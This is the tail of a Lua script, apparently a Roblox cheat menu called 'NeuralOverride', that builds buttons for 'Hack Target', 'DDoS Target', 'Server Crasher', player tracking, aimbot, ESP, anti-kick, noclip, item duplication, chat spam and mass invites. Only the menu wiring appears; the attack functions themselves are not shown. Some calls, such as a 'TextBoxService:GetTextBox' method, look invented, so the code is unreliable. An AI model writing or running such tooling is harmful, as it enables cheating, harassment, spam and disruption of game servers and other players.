            addButton("🧟 Spawn Bots (10)", function() spawnBots(10) end, Color3.new(0.8, 0.6, 0))
            addButton("🧟 Spawn Bots (50)", function() spawnBots(50) end, Color3.new(0.8, 0.6, 0))
            addButton("👹 Smart Monsters (10)", function() spawnSmartMonsters(10) end, Color3.new(0.8, 0, 0.6))
            addButton("👹 Smart Monsters (30)", function() spawnSmartMonsters(30) end, Color3.new(0.8, 0, 0.6))
            addButton("🌀 Portal (5)", function() createPortals(5) end, Color3.new(0.5, 0, 0.8))
            addButton("🌀 Portal (15)", function() createPortals(15) end, Color3.new(0.5, 0, 0.8))
        elseif currentTab == 3 then
            addButton("💀 Hack Target", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя цели")
                if name and name ~= "" then hackTarget(name) end
            end, Color3.new(1, 0, 0))
            addButton("💀 DDoS Target", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя цели")
                if name and name ~= "" then ddosTarget(name) end
            end, Color3.new(1, 0.3, 0))
            addButton("👁️ Track Player", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя цели")
                if name and name ~= "" then trackPlayer(name) end
            end, Color3.new(0, 0.8, 0.8))
            addButton("🔍 Scan Vulns", scanVulnerabilities, Color3.new(0.6, 0.2, 0.8))
            addButton("💥 Server Crasher", serverCrasher, Color3.new(1, 0.2, 0.2))
            addButton("🌍 Global Chaos", globalChaos, Color3.new(0.9, 0.1, 0.5))
            addButton("🚀 Invade", invade, Color3.new(0.8, 0.4, 0))
        elseif currentTab == 4 then
            addButton("🎯 Aimbot", toggleAimbot, Color3.new(0, 1, 0.3))
            addButton("🎯 Silent Aim", toggleSilentAim, Color3.new(0, 0.8, 0.5))
            addButton("👁️ ESP", toggleESP, Color3.new(0, 0.5, 1))
            addButton("🚫 Anti-Kick", toggleAntiKick, Color3.new(1, 0.5, 0))
            addButton("💨 Speed (100)", function() setSpeed(100) end, Color3.new(0.2, 0.8, 0.8))
            addButton("💨 Speed (200)", function() setSpeed(200) end, Color3.new(0.2, 0.8, 0.8))
            addButton("🧱 NoClip", toggleNoClip, Color3.new(0.6, 0.3, 0.9))
            addButton("🦘 Infinite Jump", toggleInfiniteJump, Color3.new(0, 1, 0.6))
            addButton("👻 Invisible", toggleInvisible, Color3.new(0.4, 0.4, 0.8))
            addButton("☀️ FullBright", setFullBright, Color3.new(1, 1, 0.2))
            addButton("💬 Anti-AFK", toggleAntiAFK, Color3.new(0.3, 0.7, 0.4))
        elseif currentTab == 5 then
            addButton("🔫 Spawn Weapon", spawnWeapon, Color3.new(1, 0.5, 0))
            addButton("📦 Duplicate Item", function()
                local name = game:GetService("TextBoxService"):GetTextBox("Имя предмета")
                if name and name ~= "" then duplicateItem(name) end
            end, Color3.new(0.2, 0.8, 0.4))
            addButton("💬 Chat Spam", function()
                local text = game:GetService("TextBoxService"):GetTextBox("Текст для спама")
                if text and text ~= "" then startSpam(text) end
            end, Color3.new(0.8, 0.2, 0.6))
            addButton("📨 Mass Invite", massInvite, Color3.new(0.2, 1, 0.6))
        end
    end

    updateContent()
end

createGUI()
print("[NeuralOverride] v3.2 загружен! Введите /commands для списка.")
